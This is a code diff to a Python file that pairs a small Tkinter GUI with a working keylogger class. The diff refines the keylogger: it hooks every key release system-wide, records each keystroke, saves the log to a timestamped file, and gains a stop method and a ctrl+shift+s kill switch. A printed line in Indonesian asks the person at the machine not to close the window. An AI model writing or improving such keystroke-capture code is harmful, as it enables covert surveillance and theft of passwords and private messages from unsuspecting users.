@@ -55,11 +55,13 @@ Button(root, text='Keluar?', command=exit, bd=0, font=("rosemary", 12, "italic")
 
 root.mainloop()
 
+
 class Keylogger:
-    def __init__(self,):
+    def __init__(self):
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+        self.running = True
 
     def callback(self, event):
         name = event.name
@@ -74,7 +76,7 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
-    
+
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
@@ -82,15 +84,29 @@ class Keylogger:
 
     def report_to_file(self):
         with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
+            f.write(self.log)
         print(f"[+] Saved {self.filename}.txt")
 
     def start(self):
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
-        print(f"{datetime.now()} - Ini jangan di silang ")
-        keyboard.wait()
-    
+        print(f"{datetime.now()}  - Ini jangan di silang.")
+
+    def stop(self):
+        self.end_dt = datetime.now()
+        self.update_filename()
+        self.report_to_file()
+        self.running = False
+        keyboard.unhook_all()
+        print(f"{datetime.now()} - Keylogger stopped.")
+
 if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.start()
+    while keylogger.running:
+        try:
+            if keyboard.is_pressed("ctrl+shift+s"):
+                keylogger.stop()
+                break
+        except:
+            pass
